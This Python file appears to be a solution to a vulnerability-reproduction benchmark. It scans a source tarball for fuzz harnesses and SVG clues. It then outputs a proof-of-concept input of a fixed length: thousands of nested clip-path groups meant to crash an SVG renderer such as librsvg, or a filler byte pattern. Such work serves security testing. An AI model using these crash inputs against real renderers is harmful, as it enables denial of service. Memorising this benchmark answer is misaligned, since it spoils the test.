import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        L_DEFAULT = 825_339

        try:
            with tarfile.open(src_path, "r:*") as tar:
                harnesses = []
                project_svg_hint = False

                for member in tar.getmembers():
                    if not member.isfile():
                        continue
                    if member.size > 1_000_000:
                        continue

                    f = tar.extractfile(member)
                    if not f:
                        continue

                    try:
                        data = f.read()
                    except Exception:
                        continue

                    lower_data = data.lower()

                    if b"llvmfuzzertestoneinput" in lower_data:
                        harnesses.append((member.name, data))

                    if (
                        b'xmlns="http://www.w3.org/2000/svg"' in lower_data
                        or b"<svg" in lower_data
                        or b"librsvg" in lower_data
                        or b"svgdocument" in lower_data
                    ):
                        project_svg_hint = True

                chosen_harness = harnesses[0] if harnesses else None
                is_svg = False

                if chosen_harness:
                    _, hdata = chosen_harness
                    text_lower = hdata.decode("utf-8", "ignore").lower()
                    if "svg" in text_lower or "librsvg" in text_lower or project_svg_hint:
                        is_svg = True
                else:
                    if project_svg_hint:
                        is_svg = True

                if is_svg:
                    return self._build_svg_poc(L_DEFAULT)
                else:
                    return self._build_binary_poc(L_DEFAULT)

        except Exception:
            return self._build_binary_poc(825_339)

    def _build_svg_poc(self, target_len: int) -> bytes:
        header = '<?xml version="1.0" encoding="UTF-8"?>\n'
        header += '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n'
        defs = "<defs>\n"
        defs += '<clipPath id="c0"><rect x="0" y="0" width="100" height="100"/></clipPath>\n'
        defs += "</defs>\n"

        parts = [header, defs]

        # Estimate a large nesting depth based on target length.
        approx_open_tag_len = len('<g clip-path="url(#c0)" id="g12345">\n')
        min_depth = 2000
        depth = max(target_len // (approx_open_tag_len * 2), min_depth)
        if depth > 50000:
            depth = 50000

        for i in range(depth):
            parts.append(f'<g clip-path="url(#c0)" id="g{i}">\n')

        parts.append('<rect x="0" y="0" width="100" height="100"/>\n')

        for _ in range(depth):
            parts.append("</g>\n")

        parts.append("</svg>\n")

        s = "".join(parts)

        if len(s) < target_len:
            pad_unit = "<!-- clip padding to increase nesting load -->\n"
            reps = target_len // len(pad_unit) + 2
            s += pad_unit * reps

        return s[:target_len].encode("utf-8")

    def _build_binary_poc(self, length: int) -> bytes:
        pattern = bytes(range(256))
        reps, rem = divmod(length, len(pattern))
        return pattern * reps + pattern[:rem]